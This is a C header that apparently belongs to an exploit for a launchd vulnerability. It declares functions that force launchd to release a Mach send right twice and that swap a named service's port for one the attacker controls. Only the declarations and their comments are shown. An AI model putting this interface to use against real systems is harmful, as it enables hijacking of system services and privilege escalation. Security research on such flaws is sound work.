#ifndef LAUNCHD_PORTREP__LAUNCHD_PORTREP_H_
#define LAUNCHD_PORTREP__LAUNCHD_PORTREP_H_

#include <mach/mach.h>
#include <stdbool.h>

/*
 * launchd_release_send_right_twice
 *
 * Description:
 * 	Cause launchd to release the specified send right twice. This should be enough to
 * 	completely release launchd's send right for most of the Mach services it vends.
 *
 * Parameters:
 * 	send_right			The send right to force launchd to release.
 *
 * Returns:
 * 	Returns true on success.
 *
 * Notes:
 * 	This function cannot detect whether the send right was actually released; it will continue
 * 	to return true even when this vulnerability is patched.
 */
bool launchd_release_send_right_twice(mach_port_t send_right);

/*
 * launchd_replace_service_port
 *
 * Description:
 * 	Replace launchd's send right to the specified service with a send right to a port we own.
 * 	We must be able to look up the service.
 *
 * Parameters:
 * 	service_name			The name of the service we want to replace.
 * 	real_service_port		On return, a send right to the real service port.
 * 	replacement_service_port	On return, a send/receive right for a newly allocated Mach
 * 					port that launchd will vend as the service port.
 *
 * Returns:
 * 	Returns true on success.
 */
bool launchd_replace_service_port(const char *service_name,
		mach_port_t *real_service_port, mach_port_t *replacement_service_port);

#endif
